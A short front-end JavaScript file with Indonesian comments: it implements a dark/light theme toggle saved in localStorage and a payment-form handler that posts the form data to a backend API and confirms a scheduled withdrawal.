document.addEventListener('DOMContentLoaded', () => {
    
    // --- THEME SWITCHER LOGIC ---
    const themeToggle = document.getElementById('theme-toggle');
    const body = document.body;

    // Fungsi untuk menerapkan tema
    const applyTheme = (theme) => {
        if (theme === 'dark') {
            body.classList.add('dark-mode');
            themeToggle.checked = true;
        } else {
            body.classList.remove('dark-mode');
            themeToggle.checked = false;
        }
    };

    // Cek tema yang tersimpan di localStorage saat halaman dimuat
    const savedTheme = localStorage.getItem('theme') || 'light';
    applyTheme(savedTheme);

    // Event listener saat tombol toggle di-klik
    themeToggle.addEventListener('change', () => {
        if (themeToggle.checked) {
            localStorage.setItem('theme', 'dark');
            applyTheme('dark');
        } else {
            localStorage.setItem('theme', 'light');
            applyTheme('light');
        }
    });


    // --- FORM SUBMISSION LOGIC (Sama seperti sebelumnya) ---
    const form = document.getElementById('payment-form');
    const submitBtn = document.getElementById('submit-btn');

    form.addEventListener('submit', async (event) => {
        event.preventDefault();

        submitBtn.disabled = true;
        submitBtn.textContent = 'Processing...';

        const formData = new FormData(form);
        const data = Object.fromEntries(formData.entries());

        try {
            const response = await fetch('https://xdr.zendshost.id/api/submit-payment', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify(data),
            });

            if (response.ok) {
                let countdown = 3;
                submitBtn.textContent = `Schedule is running... ${countdown}s`;
                const intervalId = setInterval(() => {
                    countdown--;
                    submitBtn.textContent = `Schedule is running... ${countdown}s`;
                    if (countdown <= 0) {
                        clearInterval(intervalId);
                        alert('Success! Your withdrawal has been scheduled.');
                        form.reset();
                        submitBtn.disabled = false;
                        submitBtn.textContent = 'Book Payment';
                    }
                }, 1000);
            } else {
                const errorResult = await response.json();
                alert(`Submission Failed: ${errorResult.error || 'Unknown server error'}`);
                submitBtn.disabled = false;
                submitBtn.textContent = 'Book Payment';
            }
        } catch (error) {
            console.error('Error submitting form:', error);
            alert('An error occurred. Please check your network connection and try again.');
            submitBtn.disabled = false;
            submitBtn.textContent = 'Book Payment';
        }
    });
});
